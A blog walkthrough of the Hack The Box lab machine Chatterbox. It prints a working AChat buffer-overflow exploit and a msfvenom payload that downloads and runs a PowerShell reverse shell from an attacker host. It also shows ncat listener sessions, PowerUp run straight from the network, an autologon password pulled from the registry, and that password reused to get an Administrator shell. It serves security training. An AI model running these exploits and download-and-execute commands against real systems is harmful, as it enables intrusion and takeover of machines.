---
layout: single
title: Chatterbox - Hack The Box
excerpt: "Chatterbox is a Easy difficulty windows machine. Intial foothold involves exploit a Buffer overflow on AChat applications. later we abuse file permission using icacls to read the files inside Administrator directory. Auto Login is enabled for Alfred user. So, we can Obtain Auto login credential Using PowerUp. Next, by using the same password for Administrator works and we can login as Administrator."
date: 2020-04-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-chatterbox/chatterbox_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - Buffer Overflow
  - Icacls
  - PowerUP
  - OSCP
---

![](/assets/images/htb-writeup-chatterbox/chatterbox_logo.png)

## Synopsis
Chatterbox is a Easy difficulty windows machine. Intial foothold involves exploit a simple `Buffer overflow` on `AChat` applications. later we abuse file permission using `icacls` to read the files inside `Administrator` directory. Auto Login is enabled for `Alfred` user. So, we can Obtain Auto login credential Using PowerUp. Next, by using the same password for `Administrator` works and we can login as `Administrator`.
## Skills Required
* Python
* Powershell
* Windows Enumeration

## Skills Learned
* Modifying public exploits
* Enumerating Window Registry
* Powershell reverse shell


 
---
## Enumeration
### Nmap
```java
# Nmap 7.60 scan initiated Sat Apr  4 00:42:06 2020 as: nmap -Pn -sC -sV -v -p9255,9256 -o full.nmap chatterbox.htb
Nmap scan report for chatterbox.htb (10.10.10.74)
Host is up (0.54s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: AChat
|_http-title: Site doesn't have a title.
9256/tcp open  achat   AChat chat system
```

Looking at the nmap output we see `http` runnig on port `92555` and its version is `AChat chat system httpd`. On port `9526` we see `achat` service running.

Doing `searchsploit` for this application. It reveals that it is vulnerable to `Remote Buffer Overflow`. Since we're not aware of its version Initally we're assuming its vulnerable.
```
Achat 0.150 beta7 - Remote Buffer Overflow                                                 | exploits/windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                    | exploits/windows/remote/36056.rb
```

We've both a `python` and `metasploit` exploit for `Achat`. we'll work with the `python` exploit. Now, we can copy the script by specifing `-m(mirror)` flag to the searchsploit.
```
searchsploit -m exploits/windows/remote/36025.py
```
```python
#!/usr/bin/python

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\
#x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\
#xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\
#xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=
#EAX -f python

#payload
<BUFFER payload>

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
```
There are few modifications need to be done before we make it work for us. This is a classic `Buffer overflow` that allows us to overflow buffer and include our malicious shell code to get back reverse shell.

We can see the `msfvenom` command in the script commented out. It helps us to generate buffer payload(buf value) including the bad characters to avoid. Sample payload shown in the code executes `calc.exe` on the target machine. So, we'll change the `CMD` value to our convinience to get a reverse shell back to us. 

We also need to change the `server_address` to IP of chatterbox. There is some length limit of `1152` bytes on the payload. Anything that exceeds probably might not work. So, we need to keep that in mind while generating shell code using msfvenom.

## Initial Foothold
we'll generate the reverse shell payload using msfvenonm
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/Invoke-PowerShellTcp.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

After running msfvenom payload will be generated in the following way 
```bash
Found 1 compatible encoders                                                                                                                                 
Attempting to encode payload with 1 iterations of x86/unicode_mixed                                                                                         
x86/unicode_mixed succeeded with size 704 (iteration=0)                                                                                                     
x86/unicode_mixed chosen with final size 704                                                                                                                
Payload size: 704 bytes                                                                                                                                     
Final size of python file: 3432 bytes                                                                                                                       
buf =  b""                                                                                                    buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"                                                buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"                                                buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"                                                buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"                                                buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"                                                buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"                                                
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41" 
```
The resulted payload size is `704` bytes, so within the limit. Now we need to add this payload to the exploit. we'll start our listener and http server to server powershell file to target inorder to get the reverse shell.

Running the exploit we get a reverse shell as `Alfred`.
```
python Achat.py
---->{P00F}!
```
```
sudo python3 -m http.server 80

Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.74 - - [10/Apr/2020 01:02:53] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
```
sudo rlwrap ncat -lvnp 9001

Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.74.
Ncat: Connection from 10.10.10.74:49158.
Windows PowerShell running as user Alfred on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
chatterbox\alfred
PS C:\users\alfred\desktop> (gc user.txt).substring(0,16)
72290246dfaedb1e
```

## Privilege Escalation
We'll start enumerating the user and possible privesc vectors.
Displaying `Alfred` Account info.
```
PS C:\users\alfred\desktop> net user alfred
User name                    Alfred
Full Name                    
Comment                      
User's comment               
Country code                 001 (United States)
Account active               Yes
Account expires              Never

Password last set            12/10/2017 10:18:08 AM
Password expires             Never
Password changeable          12/10/2017 10:18:08 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   4/9/2020 3:05:55 PM

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
```

Looking at other users on the system. we see three users on system including `Alfred`.
```
PS C:\users\alfred\desktop> net users

User accounts for \\CHATTERBOX

-------------------------------------------------------------------------------
Administrator            Alfred                   Guest          
```
Having a look at privileges `Alfred` has:
```
PS C:\users\alfred\desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```
Looking at the `systeminfo`. We observe that 208 hotfixes installed so it's unlikely we can escalate privilege  using a kernel exploit.
```
PS C:\users\alfred\desktop> systeminfo                                                                                                                                   
                                                                                                                                                                          
Host Name:                 CHATTERBOX                                                                                                                                    
OS Name:                   Microsoft Windows 7 Professional                                                                                                              
OS Version:                6.1.7601 Service Pack 1 Build 7601                                                                                                            
OS Manufacturer:           Microsoft Corporation                                                                                                                         
OS Configuration:          Standalone Workstation                                                                                                                        
OS Build Type:             Multiprocessor Free                                                                                                                           
Registered Owner:          Windows User                                                                                                                                  
Registered Organization:                                                                                                                                                 
Product ID:                00371-223-0897461-86794                                                                                                                       
Original Install Date:     12/10/2017, 9:18:19 AM                                                                                                                        
System Boot Time:          4/9/2020, 3:05:42 PM                                                                                                                          
System Manufacturer:       VMware, Inc.                                                                                                                                  
System Model:              VMware Virtual Platform                                                                                                                       
System Type:               X86-based PC                                                                                                                                  
Processor(s):              2 Processor(s) Installed.                                                                                                                     
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                                                                                 
                           [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz                                                                                 
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018                                                                                                     
Windows Directory:         C:\Windows                                                                                                                                    
System Directory:          C:\Windows\system32                                                                                                                           
Boot Device:               \Device\HarddiskVolume1                                                                                                                       
System Locale:             en-us;English (United States)                                                                                                                 
Input Locale:              en-us;English (United States)                                                                                                                 
Time Zone:                 (UTC-05:00) Eastern Time (US & Canada)                                                                                                        
Total Physical Memory:     2,047 MB                                                                                                                                      
Available Physical Memory: 1,501 MB                                                                                                                                      
Virtual Memory: Max Size:  4,095 MB                                                                                                                                      
Virtual Memory: Available: 3,370 MB                                                                                                                                      
Virtual Memory: In Use:    725 MB                                                                                                                                        
Page File Location(s):     C:\pagefile.sys                                                                                                                               
Domain:                    WORKGROUP                                                                                                                                     
Logon Server:              \\CHATTERBOX                                                                                                                                  
Hotfix(s):                 208 Hotfix(s) Installed. 
```

Travesing over the directories . We observe that we have access to `Administrator` directory. But we don't have permission to view the root flag.
```
PS C:\users\Administrator\Desktop> gc root.txt
PS C:\users\Administrator\Desktop> Get-Content : Access to the path 'C:\users\Administrator\Desktop\root.txt' is d
enied.
At line:1 char:3
+ gc <<<<  root.txt
    + CategoryInfo          : PermissionDenied: (C:\users\Administrator\Deskto 
   p\root.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsof 
   t.PowerShell.Commands.GetContentCommand
```

Viewing the permission on `root.txt`. We observer that only `Administrator` has full access(F) on that file.
```
PS C:\users\administrator\desktop> icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

Since we're able to enter into `desktop` directory. let's check our permissions on the directory
```
PS C:\users\administrator> icacls Desktop
Desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

We've full access(F) on the `Desktop` directory .The `Alfred` user also configured to own the `root.txt` file.
So we can simply grant access to ourselves  using `icalcs`.
```
PS C:\users\administrator\desktop> icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
```
And now we're able to view the `root.txt` file.
```
PS C:\users\administrator\desktop> (gc root.txt).substring(0,16)
a673d1b1fa95c276
```

## Privilege escalation through Auto Login creds
We can run `PowerUP.ps1` and perfom `Invoke-AllChecks` to see any possible privesc vectors.
```
PS C:\tmp> IEX(New-Object Net.WebClient).downloadString("http://10.10.14.17/PowerUp.ps1")
PS C:\tmp> Invoke-AllChecks                                                                                   <SNIP>                                      
DefaultDomainName    :                                                                                                                                                   
DefaultUserName      : Alfred                                                                                                                                            
DefaultPassword      : Welcome1!                                                                                                                                         
AltDefaultDomainName :                                                                                                                                                   
AltDefaultUserName   :                                                                                                                                                   
AltDefaultPassword   :   
<SNIP>
```
It reveals the `Auto Login` is enabled for `Alfred` user and its password is `Welcome1!`. We can try same password for `Administrator` and see if it works.

We'll create a credential object for this purpose.
```
PS C:\tmp> $password = convertto-securestring -AsPlainText -Force -String "Welcome1!"
PS C:\tmp> $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "chatterbox\administrator",$password;
PS C:\tmp> $credential

UserName                                                               Password
--------                                                               --------
chatterbox\administrator                           System.Security.SecureString
```

Now, we can pass this credential to `Start-Process` and Invoke a powershell script from our machine to get reverse shell as `administrator`.
```
PS C:\tmp> Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/Invoke-PowerShellTcp.ps1')" -Credential $credential
```

And we got reverse shell as `Administrator`.
```
sudo rlwrap ncat -lnvp 9001

Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.74.
Ncat: Connection from 10.10.10.74:49163.
Windows PowerShell running as user Administrator on CHATTERBOX
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tmp>whoami
chatterbox\administrator
PS C:\tmp> hostname
Chatterbox
```